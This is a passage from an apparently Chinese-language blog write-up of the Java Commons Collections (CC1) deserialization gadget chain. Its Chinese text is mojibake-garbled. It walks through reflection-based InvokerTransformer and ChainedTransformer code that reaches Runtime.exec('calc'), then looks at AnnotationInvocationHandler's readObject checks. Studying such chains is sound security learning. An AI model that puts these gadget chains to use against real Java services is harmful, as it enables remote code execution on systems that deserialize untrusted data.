<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å– getRuntime()æ–¹æ³•</span></span><br><span class="line"><span class="comment">//å…¶ä¸­ Runtime.class -&gt; java.lang.Runtimeï¼ŒRuntime.class.getClass() -&gt; java.lang.Class</span></span><br><span class="line"><span class="comment">//æœ€ç»ˆè°ƒç”¨ä¸º java.lang.Class.getMethod(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;).invoke(Runtime.class, &quot;getRuntime&quot;) --&gt; Runtime.class.getDeclaredMethod(&quot;getRuntime&quot;, null) --&gt; Runtime.getRuntime()</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line"><span class="comment">//å…ˆé€šè¿‡åå°„å†™å…¥åŠ¨æ€å‚æ•°ï¼Œæ‰§è¡Œçš„æ–¹æ³•æ˜¯gerDeclaredç”¨äºé€šè¿‡æ–¹æ³•åå’Œå‚æ•°ç±»å‹è¿”å›å¯¹åº”çš„Methodå¯¹è±¡ï¼Œå®é™…ä¸Šè·å–çš„å°±æ˜¯Runtime.getRuntime()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å– Runtimeå®ä¾‹</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;).transform(getRuntime);</span><br><span class="line"><span class="comment">//getRuntimeå†™å…¥å‚æ•°ä¹‹åä½œä¸ºruntimeçš„å‚æ•°ï¼Œinvokeä½œä¸ºæ–¹æ³•åé€šè¿‡åå°„æ‰§è¡ŒRuntime.getRuntime()è¿”å›çš„æ˜¯Runtimeå®ä¾‹</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ‰§è¡Œå‘½ä»¤RCE</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(runtime);</span><br><span class="line"><span class="comment">//æœ€åé€šè¿‡execæ‰§è¡Œå‘½ä»¤ï¼Œä¹Ÿå°±æ˜¯ç›´æ¥Runtime.exec()è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>è¿™ä¸ªåå°„ä¹Ÿæ˜¯çœ‹äº†å¾ˆä¹…ï¼Œæœç„¶ä»¥å‰å­¦Javaæ—¶æ²¡æœ‰å­¦æ‡‚çš„ä¸œè¥¿éƒ½è¦åœ¨å…¶ä»–åœ°æ–¹äº¤å­¦è´¹</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251006221229413.png" class title="image-20251006221229413">

<p>äºæ˜¯Runtimeè¿™ä¸ªç±»æ— æ³•åºåˆ—åŒ–çš„é—®é¢˜é€šè¿‡åå°„è§£å†³äº†</p>
<p>ä½†æ˜¯ä¸Šé¢çš„å†™æ³•å¾ˆå¤šä¹Ÿä¸æ–¹ä¾¿å®ç°ï¼Œæ¯•ç«Ÿååºåˆ—åŒ–çš„æ—¶å€™å¯ä¸èƒ½é‚£ä¹ˆåµŒå¥—æ“ä½œ</p>
<p>å¯ä»¥é€šè¿‡è°ƒç”¨ ChainedTransformerç±»ä¸­æ–¹æ³•æ¥å®ç°ç®€åŒ–ã€‚ChainedTransformerç±»å®ç°äº†Transformer, Serializableä¸¤æ¥å£ï¼Œç¬¦åˆæ¡ä»¶ï¼š</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable </span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>ç„¶åæ¥çœ‹æ„é€ å‡½æ•°</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>å°†æˆ‘ä»¬çš„æ•°ç»„è¿›è¡Œèµ‹å€¼</p>
<p>ç„¶åå®ƒè¿˜é‡å†™äº†transformæ–¹æ³•ï¼Œå¯¹æˆ‘ä»¬ä¼ å…¥çš„æ•°ç»„è¿›è¡Œéå†ï¼Œç„¶åè°ƒç”¨ä¸€æ¬¡transformæ–¹æ³•</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥å°†ä¸Šé¢çš„ä¸‰æ¬¡è°ƒç”¨transformæ–¹æ³•æ”¾å…¥ä¸€ä¸ªæ•°ç»„ä¸­ç„¶åéå†å³å¯ï¼Œè™½ç„¶ä¸çŸ¥é“ä»£ç ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆå†™ä½†æ˜¯è¿™çš„ç¡®æœ‰ç‚¹å·§å¦™</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">       Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">       &#125;;</span><br><span class="line">       <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">chainedTransformer.transform(Runtime.class);          <span class="comment">//ä½œä¸ºæœ€å¼€å§‹çš„è¾“å…¥ä¼ å…¥ï¼Œå…¶ä»–çš„éƒ½æ˜¯äº’ç›¸åµŒå¥—è€Œå·²ã€‚</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>



<h4 id="2-ifè¯­å¥é—®é¢˜"><a href="#2-ifè¯­å¥é—®é¢˜" class="headerlink" title="2.ifè¯­å¥é—®é¢˜"></a>2.ifè¯­å¥é—®é¢˜</h4><p>æˆ‘å¼€å§‹è®¤ä¸ºé‚£ä¸¤ä¸ªifè¯­å¥åªè¦æ˜¯æ­£å¸¸æƒ…å†µä¸‹å°±ä¼šé€šè¿‡ï¼Œæ²¡æƒ³åˆ°åˆ°å¤´æ¥è¿˜è¦è‡ªå·±å»è§¦å‘</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">    <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">          value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">        memberValue.setValue(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                    annotationType.members().get(name)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>è™½ç„¶ç°åœ¨æˆ‘ä»¬è¿˜æ— æ³•æ§åˆ¶setValueçš„å‚æ•°ï¼Œä½†æ˜¯è¿˜æ˜¯å…ˆè§¦å‘å‡½æ•°äº†å†è¯´</p>
<p>åœ¨ readObject()æ–¹æ³•å¤„ä¸‹æ–­ç‚¹ï¼Œå‘ç°æœªé€šè¿‡ç¬¬ä¸€ä¸ª ifæ¡ä»¶çš„é™åˆ¶ï¼ŒåŸå› ä¸º memberTypeä¸ºç©ºï¼š</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3366919-20241022081710394-1761763577.png" class title="image">

<p>å…ˆæ˜¯çœ‹åˆ°ä»£ç </p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">annotationType = AnnotationType.getInstance(type);</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>ä»typeä¸­è·å–äº†ä¸€ä¸ªæ³¨è§£å¯¹è±¡å®ä¾‹ï¼ŒAnnotationTypeæ˜¯ä¸“é—¨ç”¨äºå¯¹æ³¨è§£ç±»å‹è¿›è¡Œæ“ä½œçš„ç±»ã€‚</p>
<p>æˆ‘ä»¬å¾€ä¸Šé¢çš„ä»£ç çœ‹ï¼Œå‘ç°typeåœ¨æ„é€ æ–¹æ³•ä¸­å¯ä»¥è¢«èµ‹å€¼</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">        superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">        superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.type = type;</span><br><span class="line">    <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>æˆ‘ä»¬å¯ä»¥ä¼ å…¥å¯¹åº”çš„æ³¨è§£ç±»å‹èµ‹å€¼åˆ°typeä¸­ï¼Œæˆ‘ä»¬çš„memberValuesä¹Ÿæ˜¯åœ¨è¿™é‡Œè¢«èµ‹å€¼çš„</p>
<p>äºæ˜¯æˆ‘ä»¬å†æ¥çœ‹</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"><span class="comment">//è·å–annotationTypeä¸­çš„memberTypes</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>ä»”ç»†çœ‹ä¸€ä¸‹annotationTypeçš„å†…å®¹ï¼Œæˆ‘å¯¹æ³¨è§£çš„ç†è§£å°±æ˜¯ä¸€ä¸ªæ ‡ç­¾ç„¶åå†™åœ¨ä¸åŒçš„ç±»å‹ä¸Šé¢ï¼Œç„¶ååœ¨ä»£ç å…è®¸çš„æ—¶å€™ä¼šåå°„è°ƒç”¨ç„¶åç„¶ä¼šæ³¨è§£è·å–çš„ä¿¡æ¯ï¼Œæ¯”å¦‚<br>@Override - æ£€æŸ¥è¯¥æ–¹æ³•æ˜¯å¦æ˜¯é‡å†™æ–¹æ³•ã€‚å¦‚æœå‘ç°å…¶çˆ¶ç±»ï¼Œæˆ–è€…æ˜¯å¼•ç”¨çš„æ¥å£ä¸­å¹¶æ²¡æœ‰è¯¥æ–¹æ³•æ—¶ï¼Œä¼šæŠ¥ç¼–è¯‘é”™è¯¯</p>
<p>ç„¶åè¿™å…¶ä¸­çš„æˆå‘˜å³memberTypeså°±æ˜¯ç”¨æ¥ä¼ é€’ä¸€äº›é…ç½®ä¿¡æ¯çš„ï¼Œè™½ç„¶æˆ‘ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¯¹äº @Target æ³¨è§£ï¼š</span></span><br><span class="line">memberTypes = &#123;</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: ElementType[].class</span><br><span class="line">    <span class="comment">// â†‘              â†‘</span></span><br><span class="line">    <span class="comment">// æˆå‘˜å         è¿”å›å€¼ç±»å‹ï¼ˆElementTypeæ•°ç»„ï¼‰</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯¹äºæ›´å¤æ‚çš„æ³¨è§£ï¼š</span></span><br><span class="line"><span class="meta">@interface</span> ComplexAnnotation &#123;</span><br><span class="line">    String <span class="title function_">name</span><span class="params">()</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">count</span><span class="params">()</span>;</span><br><span class="line">    Class&lt;?&gt; type();</span><br><span class="line">    String[] tags();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯¹åº”çš„memberTypesï¼š</span></span><br><span class="line">memberTypes = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: String.class,</span><br><span class="line">    <span class="string">&quot;count&quot;</span>: <span class="type">int</span>.class, </span><br><span class="line">    <span class="string">&quot;type&quot;</span>: Class.class,</span><br><span class="line">    <span class="string">&quot;tags&quot;</span>: String[].class</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>ç„¶åæˆ‘ä»¬å†æ¥çœ‹ä¸¤ä¸ªif</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">    <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">          value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">        memberValue.setValue(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                    annotationType.members().get(name)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

